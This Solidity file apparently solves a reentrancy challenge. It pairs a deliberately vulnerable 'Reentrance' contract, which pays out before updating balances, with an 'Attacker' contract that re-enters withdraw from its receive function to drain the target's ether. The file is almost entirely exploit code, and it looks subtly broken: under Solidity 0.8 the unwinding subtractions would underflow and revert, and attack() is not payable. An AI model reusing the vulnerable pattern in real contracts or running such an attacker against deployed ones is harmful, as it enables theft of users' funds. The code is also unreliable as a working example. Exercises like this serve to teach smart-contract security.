// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrance {

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}


contract Attacker {
    Reentrance reentrance;
    address payable public owner;

    constructor(address _reentranceAddress) {
        reentrance = Reentrance(payable(_reentranceAddress));
        owner = payable(msg.sender);
    }

    function attack() external {
        // require(msg.value >= 1 ether, "Need at least 1 ether to attack");

        reentrance.donate{value: 1 ether}(address(this));

        reentrance.withdraw(1 ether);
    }

    // fallback() external payable {
    //     // if (address(reentrance).balance >= 2 ether) {
    //         reentrance.withdraw(0.5 ether);
    //     // }
    // }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        owner.transfer(address(this).balance);
    }

    receive() external payable {
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(0.5 ether);
        }
    }
}
